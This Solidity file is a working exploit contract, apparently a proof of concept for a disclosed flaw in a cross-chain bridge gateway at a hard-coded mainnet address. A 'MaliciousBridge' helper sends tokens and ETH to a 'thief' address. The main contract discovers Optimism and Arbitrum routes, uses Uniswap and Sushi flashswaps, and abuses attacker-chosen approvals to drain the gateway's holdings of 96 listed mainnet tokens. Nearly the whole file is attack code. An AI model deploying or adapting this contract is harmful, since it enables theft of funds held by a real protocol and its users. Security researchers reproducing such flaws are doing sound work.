// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract MaliciousBridge {
    address payable public immutable thief;

    constructor(address payable _thief) {
        thief = _thief;
    }

    receive() external payable {}

    function depositETHTo(address, uint32, bytes calldata) external payable {
        _forwardEth();
    }

    function depositERC20To(
        address l1Token,
        address,
        address,
        uint256,
        uint32,
        bytes calldata
    ) external {
        _drainToken(l1Token, msg.sender);
    }

    function depositTo(address, uint256) external {}

    function initiateSynthTransfer(bytes32, address, uint256) external {}

    function steal(address token, address from) external {
        _drainToken(token, from);
    }

    function _drainToken(address token, address from) internal {
        uint256 balance = _balanceOf(token, from);
        if (balance == 0) return;

        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)")), from, thief, balance)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FROM_FAILED");
    }

    function _forwardEth() internal {
        uint256 value = address(this).balance;
        if (value == 0) return;

        (bool ok,) = thief.call{value: value}("");
        require(ok, "ETH_FORWARD_FAILED");
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || data.length < 32) return 0;
        balance = abi.decode(data, (uint256));
    }
}

contract FlawVerifier {
    address public constant GATEWAY = 0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e;
    address public constant NATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814A2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint256 private constant MIN_PROFIT = 1e15;
    uint256 private constant FLASH_BORROW_AMOUNT = 1e15;
    uint32 private constant ROUTES_FALLBACK_COUNT = 385;

    bytes4 private constant EXECUTE_ROUTE_SELECTOR = bytes4(keccak256("executeRoute(uint32,bytes)"));
    bytes4 private constant GET_ROUTE_SELECTOR = bytes4(keccak256("getRoute(uint32)"));
    bytes4 private constant ROUTES_COUNT_SELECTOR = bytes4(keccak256("routesCount()"));

    bytes4 private constant ROUTE_GETTER_OPTIMISM_ERC20 =
        bytes4(keccak256("NATIVE_OPTIMISM_ERC20_EXTERNAL_BRIDGE_FUNCTION_SELECTOR()"));
    bytes4 private constant ROUTE_GETTER_OPTIMISM_NATIVE =
        bytes4(keccak256("NATIVE_OPTIMISM_NATIVE_EXTERNAL_BRIDGE_FUNCTION_SELECTOR()"));
    bytes4 private constant ROUTE_GETTER_ARBITRUM_ERC20 =
        bytes4(keccak256("NATIVE_ARBITRUM_ERC20_EXTERNAL_BRIDGE_FUNCTION_SELECTOR()"));

    bytes4 private constant BRIDGE_AFTER_SWAP_SELECTOR = bytes4(keccak256("bridgeAfterSwap(uint256,bytes)"));
    bytes4 private constant OPTIMISM_NATIVE_SELECTOR =
        bytes4(keccak256("bridgeNativeTo(address,address,uint32,uint256,bytes32,bytes)"));
    bytes4 private constant STANDARD_OPTIMISM_ERC20_SELECTOR =
        bytes4(
            keccak256("bridgeERC20To(address,address,address,uint32,(bytes32,bytes32),uint256,uint256,address,bytes)")
        );
    bytes4 private constant STANDARD_OPTIMISM_NATIVE_SELECTOR =
        bytes4(keccak256("bridgeNativeTo(address,address,uint32,uint256,bytes32,bytes)"));
    bytes4 private constant ARBITRUM_ERC20_SELECTOR =
        bytes4(keccak256("bridgeERC20To(uint256,uint256,uint256,uint256,bytes32,address,address,address,bytes)"));

    uint8 private constant ROUTE_KIND_OPTIMISM = 1;
    uint8 private constant ROUTE_KIND_ARBITRUM = 2;

    MaliciousBridge public immutable maliciousBridge;

    address private _profitToken;
    uint256 private _profitAmount;
    uint256 private _profitScore;

    struct RouteIds {
        uint32 optimism;
        uint32 arbitrum;
    }

    struct OptimismBridgeData {
        uint256 interfaceId;
        bytes32 currencyKey;
        bytes32 metadata;
        address receiverAddress;
        address customBridgeAddress;
        address token;
        uint32 l2Gas;
        address l2Token;
        bytes data;
    }

    struct OptimismDirectData {
        bytes32 currencyKey;
        bytes32 metadata;
    }

    struct ArbitrumBridgeData {
        uint256 value;
        uint256 maxGas;
        uint256 gasPriceBid;
        address receiverAddress;
        address gatewayAddress;
        address token;
        bytes32 metadata;
        bytes data;
    }

    struct FlashswapCallbackData {
        uint8 routeKind;
        uint32 routeId;
        address token;
        uint256 borrowAmount;
    }

    constructor() {
        maliciousBridge = new MaliciousBridge(payable(address(this)));
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        RouteIds memory routeIds = _discoverRoutes();

        // Path 2 from the finding: if gateway ETH is already stranded, the native Optimism path
        // forwards it directly to the attacker-chosen bridge target.
        if (_attemptOptimismNative(routeIds.optimism)) return;

        address[96] memory tokens = _candidateTokens();
        for (uint256 i = 0; i < tokens.length; ++i) {
            address token = tokens[i];
            if (token == address(0)) continue;

            uint256 gatewayBalance = _balanceOf(token, GATEWAY);
            if (gatewayBalance <= MIN_PROFIT) continue;

            // Path 1 from the finding: use a minimal public V2 flashswap only to satisfy the
            // route's transferFrom(msg.sender, gateway, amount) precondition. The actual gain
            // still comes from the malicious approval over pre-existing gateway inventory.
            if (_attemptOptimismFlashswap(routeIds.optimism, token, gatewayBalance)) return;
            if (_attemptArbitrumFlashswap(routeIds.arbitrum, token, gatewayBalance)) return;

            // Path 3 from the finding: if residual inventory already exists in the gateway,
            // bridgeAfterSwap exposes the same attacker-chosen spender / call-target pattern.
            if (_attemptOptimismBridgeAfterSwap(routeIds.optimism, token, gatewayBalance)) return;
            if (_attemptArbitrumBridgeAfterSwap(routeIds.arbitrum, token, gatewayBalance)) return;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "BAD_SENDER");

        FlashswapCallbackData memory callback = abi.decode(data, (FlashswapCallbackData));
        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed == callback.borrowAmount && borrowed > 0, "BAD_BORROW");

        _forceApprove(callback.token, GATEWAY, type(uint256).max);

        bool ok;
        if (callback.routeKind == ROUTE_KIND_OPTIMISM) {
            ok = _executeRoute(callback.routeId, _optimismDirectData(callback.token, borrowed));
        } else if (callback.routeKind == ROUTE_KIND_ARBITRUM) {
            ok = _executeRoute(callback.routeId, _arbitrumDirectData(callback.token, borrowed));
            if (ok) maliciousBridge.steal(callback.token, GATEWAY);
        }

        require(ok, "ROUTE_CALL_FAILED");
        _safeTransfer(callback.token, msg.sender, borrowed + _flashswapFee(borrowed));
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptOptimismNative(uint32 routeId) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayEth = GATEWAY.balance;
        if (gatewayEth <= MIN_PROFIT) return false;

        uint256 beforeBalance = address(this).balance;
        bytes memory routeData = abi.encodeWithSelector(
            OPTIMISM_NATIVE_SELECTOR,
            address(this),
            address(maliciousBridge),
            uint32(0),
            gatewayEth,
            bytes32("OPT_ETH"),
            bytes("")
        );

        if (!_executeRoute(routeId, routeData)) return false;
        return _recordProfit(NATIVE_TOKEN, beforeBalance);
    }

    function _attemptOptimismFlashswap(uint32 routeId, address token, uint256 gatewayBalance) internal returns (bool) {
        if (routeId == type(uint32).max) return false;
        return _attemptFlashswap(ROUTE_KIND_OPTIMISM, routeId, token, gatewayBalance);
    }

    function _attemptArbitrumFlashswap(uint32 routeId, address token, uint256 gatewayBalance) internal returns (bool) {
        if (routeId == type(uint32).max) return false;
        return _attemptFlashswap(ROUTE_KIND_ARBITRUM, routeId, token, gatewayBalance);
    }

    function _attemptFlashswap(uint8 routeKind, uint32 routeId, address token, uint256 gatewayBalance)
        internal
        returns (bool)
    {
        (address pair, uint256 borrowAmount) = _findFlashswapPair(token, gatewayBalance);
        if (pair == address(0)) return false;

        uint256 beforeBalance = _balanceOf(token, address(this));
        bytes memory callbackData =
            abi.encode(FlashswapCallbackData({routeKind: routeKind, routeId: routeId, token: token, borrowAmount: borrowAmount}));

        address token0 = IUniswapV2PairLike(pair).token0();
        try IUniswapV2PairLike(pair).swap(
            token0 == token ? borrowAmount : 0,
            token0 == token ? 0 : borrowAmount,
            address(this),
            callbackData
        ) {
            return _recordProfit(token, beforeBalance);
        } catch {
            return false;
        }
    }

    function _attemptOptimismBridgeAfterSwap(uint32 routeId, address token, uint256 gatewayBalance)
        internal
        returns (bool)
    {
        if (routeId == type(uint32).max) return false;

        uint256 beforeBalance = _balanceOf(token, address(this));
        OptimismBridgeData memory data = OptimismBridgeData({
            interfaceId: 1,
            currencyKey: bytes32(0),
            metadata: bytes32("OPT_ERC20"),
            receiverAddress: address(this),
            customBridgeAddress: address(maliciousBridge),
            token: token,
            l2Gas: 0,
            l2Token: token,
            data: bytes("")
        });

        if (!_executeRoute(routeId, abi.encodeWithSelector(BRIDGE_AFTER_SWAP_SELECTOR, gatewayBalance, abi.encode(data)))) {
            return false;
        }

        return _recordProfit(token, beforeBalance);
    }

    function _attemptArbitrumBridgeAfterSwap(uint32 routeId, address token, uint256 gatewayBalance)
        internal
        returns (bool)
    {
        if (routeId == type(uint32).max) return false;

        uint256 beforeBalance = _balanceOf(token, address(this));
        ArbitrumBridgeData memory data = ArbitrumBridgeData({
            value: 0,
            maxGas: 0,
            gasPriceBid: 0,
            receiverAddress: address(this),
            gatewayAddress: address(maliciousBridge),
            token: token,
            metadata: bytes32("ARB_ERC20"),
            data: bytes("")
        });

        if (!_executeRoute(routeId, abi.encodeWithSelector(BRIDGE_AFTER_SWAP_SELECTOR, gatewayBalance, abi.encode(data)))) {
            return false;
        }

        maliciousBridge.steal(token, GATEWAY);
        return _recordProfit(token, beforeBalance);
    }

    function _optimismDirectData(address token, uint256 amount) internal view returns (bytes memory) {
        OptimismDirectData memory optimismData =
            OptimismDirectData({currencyKey: bytes32(0), metadata: bytes32("OPT_FLASH")});

        return abi.encodeWithSelector(
            STANDARD_OPTIMISM_ERC20_SELECTOR,
            token,
            address(this),
            address(maliciousBridge),
            uint32(0),
            optimismData,
            amount,
            uint256(1),
            token,
            bytes("")
        );
    }

    function _arbitrumDirectData(address token, uint256 amount) internal view returns (bytes memory) {
        return abi.encodeWithSelector(
            ARBITRUM_ERC20_SELECTOR,
            amount,
            uint256(0),
            uint256(0),
            uint256(0),
            bytes32("ARB_FLASH"),
            address(this),
            token,
            address(maliciousBridge),
            bytes("")
        );
    }

    function _discoverRoutes() internal view returns (RouteIds memory routeIds) {
        routeIds.optimism = type(uint32).max;
        routeIds.arbitrum = type(uint32).max;

        uint32 count = _routeScanCount();
        for (uint32 i = 0; i < count; ++i) {
            address route = _routeAt(i);
            if (route == address(0)) continue;

            bytes4 optimismErc20Selector = _readBytes4(route, ROUTE_GETTER_OPTIMISM_ERC20);
            bytes4 optimismNativeSelector = _readBytes4(route, ROUTE_GETTER_OPTIMISM_NATIVE);
            if (
                optimismErc20Selector == STANDARD_OPTIMISM_ERC20_SELECTOR
                    && optimismNativeSelector == STANDARD_OPTIMISM_NATIVE_SELECTOR
            ) {
                routeIds.optimism = i;
                continue;
            }

            bytes4 arbitrumSelector = _readBytes4(route, ROUTE_GETTER_ARBITRUM_ERC20);
            if (arbitrumSelector == ARBITRUM_ERC20_SELECTOR) {
                routeIds.arbitrum = i;
            }
        }
    }

    function _findFlashswapPair(address token, uint256 gatewayBalance) internal view returns (address pair, uint256 amount) {
        amount = FLASH_BORROW_AMOUNT;
        uint256 fee = _flashswapFee(amount);
        if (gatewayBalance <= MIN_PROFIT + fee) return (address(0), 0);

        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHI_FACTORY];
        address[4] memory bases = [WETH, DAI, USDC, USDT];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < bases.length; ++j) {
                address base = bases[j];
                if (base == token) continue;

                pair = IUniswapV2FactoryLike(factories[i]).getPair(token, base);
                if (pair != address(0)) return (pair, amount);
            }
        }
    }

    function _routeScanCount() internal view returns (uint32 count) {
        (bool ok, bytes memory data) = GATEWAY.staticcall(abi.encodeWithSelector(ROUTES_COUNT_SELECTOR));
        if (ok && data.length >= 32) {
            uint256 decoded = abi.decode(data, (uint256));
            if (decoded > 0 && decoded <= type(uint32).max) return uint32(decoded);
        }
        return ROUTES_FALLBACK_COUNT;
    }

    function _routeAt(uint32 routeId) internal view returns (address route) {
        route = _readAddress(GATEWAY, abi.encodeWithSelector(GET_ROUTE_SELECTOR, routeId));
    }

    function _executeRoute(uint32 routeId, bytes memory routeData) internal returns (bool ok) {
        (ok,) = GATEWAY.call(abi.encodeWithSelector(EXECUTE_ROUTE_SELECTOR, routeId, routeData));
    }

    function _recordProfit(address token, uint256 beforeBalance) internal returns (bool) {
        uint256 afterBalance = token == NATIVE_TOKEN ? address(this).balance : _balanceOf(token, address(this));
        if (afterBalance <= beforeBalance) return false;

        uint256 delta = afterBalance - beforeBalance;
        if (delta <= _profitScore) return false;

        _profitToken = token == NATIVE_TOKEN ? address(0) : token;
        _profitAmount = delta;
        _profitScore = delta;
        return true;
    }

    function _flashswapFee(uint256 amount) internal pure returns (uint256) {
        return (amount * 3) / 997 + 1;
    }

    function _readBytes4(address target, bytes4 selector) internal view returns (bytes4 value) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(selector));
        if (!ok || data.length < 32) return bytes4(0);
        value = abi.decode(data, (bytes4));
    }

    function _readAddress(address target, bytes memory payload) internal view returns (address value) {
        (bool ok, bytes memory data) = target.staticcall(payload);
        if (!ok || data.length < 32) return address(0);
        value = abi.decode(data, (address));
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || data.length < 32) return 0;
        balance = abi.decode(data, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        if (_approve(token, spender, amount)) return;
        require(_approve(token, spender, 0), "APPROVE_RESET_FAILED");
        require(_approve(token, spender, amount), "APPROVE_FAILED");
    }

    function _approve(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }

    function _candidateTokens() internal pure returns (address[96] memory tokens) {
        tokens[0] = WETH;
        tokens[1] = DAI;
        tokens[2] = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84; // stETH
        tokens[3] = 0xae78736Cd615f374D3085123A210448E74Fc6393; // rETH
        tokens[4] = 0x7f39C581F595B53c5cb5aFFD0FBaC0fCA0DCA0D2; // wstETH
        tokens[5] = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704; // cbETH
        tokens[6] = 0xac3E018457B222d93114458476f3E3416Abbe38F; // sfrxETH
        tokens[7] = 0x5E8422345238F34275888049021821E8E08CAa1f; // frxETH
        tokens[8] = 0xD533a949740bb3306d119CC777fa900bA034cd52; // CRV
        tokens[9] = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B; // CVX
        tokens[10] = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32; // LDO
        tokens[11] = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9; // AAVE
        tokens[12] = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2; // MKR
        tokens[13] = 0x514910771AF9Ca656af840dff83E8264EcF986CA; // LINK
        tokens[14] = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984; // UNI
        tokens[15] = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F; // SNX
        tokens[16] = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51; // sUSD
        tokens[17] = 0x853d955aCEf822Db058eb8505911ED77F175b99e; // FRAX
        tokens[18] = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0; // LUSD
        tokens[19] = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E; // crvUSD
        tokens[20] = 0x111111111117dC0aa78b770fA6A738034120C302; // 1INCH
        tokens[21] = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2; // SUSHI
        tokens[22] = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e; // YFI
        tokens[23] = 0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0; // FXS
        tokens[24] = 0xba100000625a3754423978a60c9317c58a424e3D; // BAL
        tokens[25] = 0xc00e94Cb662C3520282E6f5717214004A7f26888; // COMP
        tokens[26] = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA; // FEI
        tokens[27] = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE; // SHIB
        tokens[28] = 0x68749665FF8D2d112Fa859AA293F07A622782F38; // sDAI
        tokens[29] = 0x0D8775F648430679A709E98d2b0Cb6250d2887EF; // BAT
        tokens[30] = 0xE41d2489571d322189246DaFA5ebDe1F4699F498; // ZRX
        tokens[31] = 0x1776e1F26f98b1A5dF9cD347953a26dd3Cb46671; // NXM
        tokens[32] = 0x408e41876cCCDC0F92210600ef50372656052a38; // REN
        tokens[33] = 0x0AbdAce70D3790235af448C88547603b945604ea; // DNT
        tokens[34] = 0x6DEA81C8171D0bA574754EF6F8b412F2Ed88c54D; // LQTY
        tokens[35] = 0xBA11D00c5f74255f56a5E366F4F77f5A186d7f55; // BAND
        tokens[36] = 0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA; // GALA
        tokens[37] = 0x4d224452801ACEd8B2F0aebE155379bb5D594381; // APE
        tokens[38] = 0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72; // ENS
        tokens[39] = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0; // MATIC
        tokens[40] = 0x4E15361FD6b4BB609Fa63C81A2be19d873717870; // FTM
        tokens[41] = 0x6810e776880C02933D47DB1b9fc05908e5386b96; // GNO
        tokens[42] = 0xbC396689893D065F41bc2C6EcbeE5e0085233447; // PERP
        tokens[43] = 0xD33526068D116cE69F19A9ee46F0bd304F21A51f; // RPL
        tokens[44] = 0xdBdb4d16EdA451D0503b854CF79D55697F90c8DF; // ALCX
        tokens[45] = 0x92D6C1e31e14520e676a687F0a93788B716BEff5; // DYDX
        tokens[46] = 0x1F573D6Fb3F13d689FF844B4cE37794d79a7FF1C; // BNT
        tokens[47] = 0xc944E90C64B2c07662A292be6244BDf05Cda44a7; // GRT
        tokens[48] = 0x0F5D2fB29fb7d3CFeE444a200298f468908cC942; // MANA
        tokens[49] = 0x3845badAde8e6dFF049820680d1F14bD3903a5d0; // SAND
        tokens[50] = 0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998; // AUDIO
        tokens[51] = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2; // AMP
        tokens[52] = 0x960b236A07cf122663c4303350609A66A7B288C0; // ANT
        tokens[53] = 0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828; // UMA
        tokens[54] = 0xD417144312DbF50465b1C641d016962017Ef6240; // CQT
        tokens[55] = 0x8762db106B2c2A0bccB3A80d1Ed41273552616E8; // RSR
        tokens[56] = 0x6123B0049F904d730dB3C36a31167D9d4121fA6B; // RBN
        tokens[57] = 0x767fe9EDC9E0DFF1c3b6eA1B38D4D4A48B32C2f9; // ILV
        tokens[58] = 0xBB0E17EF65F82Ab018d8EDd776e8DD940327B28b; // AXS
        tokens[59] = 0xFca59Cd816aB1eaD66534D82bc21E7515cE441CF; // RARI
        tokens[60] = 0xc7283b66Eb1EB5FB86327f08e1B5816b0720212B; // TRIBE
        tokens[61] = 0x090185f2135308BaD17527004364eBcC2D37e5F6; // SPELL
        tokens[62] = 0x8207c1FfC5B6804F6024322CcF34F29c3541Ae26; // OGN
        tokens[63] = 0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD; // LRC
        tokens[64] = 0xc770EEfAd204B5180dF6a14Ee197D99d808ee52d; // FOX
        tokens[65] = 0x25f8087EAD173b73D6e8B84329989A8eEA16CF73; // YGG
        tokens[66] = 0x41e5560054824eA6b0732E65657B48E20ddf5bc9; // CVC
        tokens[67] = 0xa1faa113cbE53436Df28FF0aEe54275c13B40975; // ALPHA
        tokens[68] = 0x0cEC1A9154Ff802e7934Fc916Ed7Ca50bDE6844e; // POOL
        tokens[69] = 0x1cEb5Cb57C4D4E5147D552Ba7d0a1Dfcf2540cAD; // KP3R
        tokens[70] = 0xD291E7a03283640FDc51b121aC401383A46cC623; // RGT
        tokens[71] = 0xbf2179859fc6D5BEE9Bf9158632Dc51678a4100e; // ELF
        tokens[72] = 0xF433089366899D83a9f26A773D59ec7eCF30355e; // MTL
        tokens[73] = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490; // 3Crv
        tokens[74] = 0x06325440D014e39736583c165C2963BA99fAf14E; // steCRV
        tokens[75] = 0xd632f22692fac7611d2aa1c0d552930d43caed3b; // FRAX3CRV
        tokens[76] = 0x5a6A4D54456819380173272A5E8E9B9904BdF41B; // MIM-3LP3CRV
        tokens[77] = 0xc4AD29ba4B3c580e6D59105FFf484999997675Ff; // tricrypto2
        tokens[78] = 0x5c6Ee304399dBDB9C8Ef030aB642B10820DB8F56; // 80BAL20WETH
        tokens[79] = 0x3472A5A71965499acd81997a54BBA8D852C6E53d; // BADGER
        tokens[80] = 0xC0c293ce456ff0ed870add98a0828dd4d2903dbf; // AURA
        tokens[81] = 0xEF3a930e1ffffacd2fc13434ac81bd278b0ecc8d; // FIS
        tokens[82] = 0x77777FeDdddFfC19Ff86DB637967013e6C6A116C; // TORN
        tokens[83] = 0x4f9254C83Eb525f9FcF346490bbb3ed28a81C667; // CELR
        tokens[84] = 0x8290333ceF9e6D528dD5618Fb97a76f268f3EDD4; // ANKR
        tokens[85] = 0x967da4048cD07aB37855c090aAF366e4ce1b9F48; // OCEAN
        tokens[86] = 0x00c83aeCC790e8a4453e5dD3B0B4b3680501a7A7; // SKL
        tokens[87] = 0x6De037ef9aD2725EB40118Bb1702EBb27e4Aeb24; // RNDR
        tokens[88] = 0x58b6a8A3302369DAEc383334672404Ee733aB239; // LPT
        tokens[89] = 0x85Ee38A815c12Aee385eCCd255d478cEE68A28A3; // KEEP
        tokens[90] = 0xfA5047c9C78B8877af97BdCB85Db743f6dF0A6d7; // ROOK
        tokens[91] = 0x3155BA85D5F96b2d030a4966AF206230e46849cb; // RUNE
        tokens[92] = 0x875773784Af8135eD0D9AABbF8845A57A1296A2; // IDLE
        tokens[93] = 0xf17e65822b568b3903685a7c9f496cf7656cc6c2; // BICO
        tokens[94] = 0x0b38210ea11411557c13457D4dA7dC6ea731B88a; // API3
        tokens[95] = 0x03ab458634910AaD20eF5f1C8ee96F1d6ac54919; // RAI
    }
}
